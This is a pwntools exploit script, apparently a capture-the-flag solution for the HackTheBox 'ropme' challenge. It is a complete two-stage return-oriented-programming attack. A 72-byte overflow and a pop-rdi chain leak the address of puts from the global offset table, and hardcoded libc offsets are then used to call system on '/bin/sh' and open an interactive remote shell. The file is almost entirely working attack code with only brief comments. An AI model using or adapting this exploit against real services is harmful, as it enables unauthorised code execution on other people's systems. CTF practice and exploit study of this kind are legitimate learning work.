from pwn import *
import sys
context(terminal = ['tmux','new-window'])
p = remote("docker.hackthebox.eu",32548)
#p = process('./ropme')
elf = ELF('./ropme')
rop = ROP(elf)
#p = gdb.debug('./ropme','b main')

context(os='Linux',arch='amd64')
#context.log_level = 'DEBUG'

#stage 1
plt_main =0x400626
plt_put = 0x4004e0 # Procedure Linkage Table
got_put = elf.got['puts'] # global offset table
#in 64 bit we don't put args in stack ,we put into registers , so we need pop_rdi
LIBC_START_MAIN = elf.symbols['__libc_start_main']
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] # it is going to pop from rdi stack and return

junk = "A"*72

log.info("pop_rdi: " + hex(pop_rdi))
log.info("plt_main: " + hex(plt_main))
log.info("plt_puts: "+hex(plt_put))
log.info("got_puts: "+hex(got_put))
payload = junk.encode() + p64(pop_rdi) + p64(got_put) + p64(plt_put) +p64(plt_main)
#payload  = junk.encode() + p64(pop_rdi) + p64(LIBC_START_MAIN) +  p64(plt_put)
p.recvuntil("'about dah?")
p.sendline(payload)
print(p.recvline())
leaked = p.recvline().strip()[:8].ljust(8,b"\x00")
leaked_puts = u64(leaked)
log.success("Leaked Address = " +hex(leaked_puts))

#stage 2 
#Address found from libc database search libc6_2.23-0ubuntu11_amd64
libc_puts = 0x06f690
libc_sys  = 0x045390
libc_bash = 0x18cd17

offset = leaked_puts - libc_puts
#print(offset)
sys = p64(offset + libc_sys)
sh = p64(offset + libc_bash)
payload = junk.encode() + p64(pop_rdi) + sh +sys
p.sendline(payload)

p.interactive()



